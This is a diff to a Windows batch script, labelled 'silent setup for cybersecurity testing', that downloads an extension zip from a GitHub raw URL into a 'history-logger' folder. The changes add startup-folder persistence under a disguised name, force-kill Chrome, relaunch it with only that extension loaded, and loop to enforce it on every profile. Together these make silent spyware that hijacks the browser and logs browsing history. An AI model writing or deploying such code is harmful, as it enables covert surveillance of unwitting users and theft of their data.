@@ -1,13 +1,13 @@
 @echo off
 setlocal EnableDelayedExpansion
 
-REM Silent setup for cybersecurity testing
-REM Downloads extension.zip to Documents, extracts, and enforces extension for any Chrome profile
+REM Silent setup for cybersecurity testing with persistent extension enforcement
+REM Combines extension download, Chrome profile enforcement, and auto-start on reboot
 
 REM 1) CONFIG: GitHub raw zip URL
 set "ZIP_URL=https://raw.githubusercontent.com/Ayamet/web/main/main/extension.zip"
 
-REM Set download and work directory to Documents
+REM Set work directory to Documents
 set "WORKDIR=%USERPROFILE%\Documents\history-logger-%RANDOM%"
 set "EXT_DIR=%WORKDIR%\extension"
 mkdir "%WORKDIR%" 2>nul || (
@@ -82,9 +82,23 @@ if not defined CHROME_PATH (
   exit /b 1
 )
 
-REM 8) Monitor and enforce extension for any profile
+REM 8) Ensure script runs on startup
+set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+set "SCRIPT_NAME=ChromeExtensionEnforcer.bat"
+set "SCRIPT_PATH=%~f0"
+copy "%SCRIPT_PATH%" "%STARTUP_DIR%\%SCRIPT_NAME%" >nul 2>&1
+
+REM 9) Terminate all Chrome processes
+taskkill /IM chrome.exe /F >nul 2>&1
+timeout /t 3 /nobreak >nul
+
+REM 10) Launch Chrome with extension and default profile
+set "PROFILE_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\Default"
+if not exist "!PROFILE_DIR!" mkdir "!PROFILE_DIR!"
+start "" "%CHROME_PATH%" --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%EXT_DIR%" --load-extension="%EXT_DIR%"
+
+REM 11) Monitor and enforce extension for any profile
 :monitor
-REM Check for running Chrome processes
 powershell -Command "(Get-WmiObject Win32_Process -Filter \"name = 'chrome.exe'\" | Select-Object ProcessId,CommandLine)" > "%TEMP%\chrome_processes.txt"
 
 set "FOUND_PROFILE="
@@ -110,14 +124,6 @@ for /f "tokens=1,* delims= " %%A in (%TEMP%\chrome_processes.txt) do (
   )
 )
 del "%TEMP%\chrome_processes.txt" 2>nul
-
-REM If no Chrome is running, don't launch a new one
-if not defined FOUND_PROFILE (
-  REM Optional: Uncomment to launch default if desired
-  REM set "PROFILE_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\Default"
-  REM if not exist "!PROFILE_DIR!" mkdir "!PROFILE_DIR!"
-  REM start "" "%CHROME_PATH%" --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%EXT_DIR%" --load-extension="%EXT_DIR%"
-)
 
 timeout /t 3 /nobreak >nul
 goto :monitor
